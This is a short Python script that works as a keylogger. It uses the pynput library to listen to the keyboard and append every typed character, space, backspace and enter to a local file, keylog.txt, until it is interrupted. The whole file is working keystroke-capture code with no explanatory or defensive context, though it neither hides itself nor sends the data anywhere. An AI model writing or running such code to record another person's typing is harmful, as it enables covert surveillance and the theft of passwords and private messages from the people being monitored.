import pynput.keyboard


log_file = open("keylog.txt", "a")


def on_press(key):
    try:
        
        log_file.write(str(key.char))
    except AttributeError:
        
        if key == pynput.keyboard.Key.space:
            log_file.write(" ")
        elif key == pynput.keyboard.Key.backspace:
            log_file.write("<Backspace>")
        elif key == pynput.keyboard.Key.enter:
            log_file.write("\n")

# Create a keyboard listener
listener = pynput.keyboard.Listener(on_press=on_press)


listener.start()


try:
    while True:
        pass
except KeyboardInterrupt:
    
    listener.stop()
    log_file.close()
    print("Keylogger stopped.")

   